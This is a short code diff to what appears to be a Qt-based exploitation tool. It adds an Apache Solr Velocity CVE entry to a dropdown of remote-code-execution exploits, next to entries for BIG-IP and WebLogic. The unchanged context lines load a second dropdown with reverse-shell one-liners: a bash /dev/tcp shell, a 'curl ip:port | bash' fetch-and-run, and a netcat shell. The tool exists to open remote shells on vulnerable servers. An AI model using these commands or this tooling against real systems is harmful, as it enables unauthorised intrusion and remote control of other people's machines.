@@ -211,7 +211,11 @@ class MainWindow(QMainWindow, QObject):
         self.textEditinfo.connect(self.handlestatusOne)
 
     def setupFunction(self):
-        items = ["CVE_2020_5902_BIG_IP_RCE","CVE_2019_2729_weblogic"]
+        items = [
+            "CVE_2020_5902_BIG_IP_RCE",
+            "CVE_2019_2729_weblogic",
+            "CVE_2019_17558_Apache_Solr_Velocity"
+        ]
         self.ui.payloadCombo.addItems(items)
         items = ["/bin/bash -i >& /dev/tcp/ip/port 0>&1", "curl ip:port | bash", "nc ip port -e /bin/bash"]
         self.ui.reboundCombo.addItems(items)
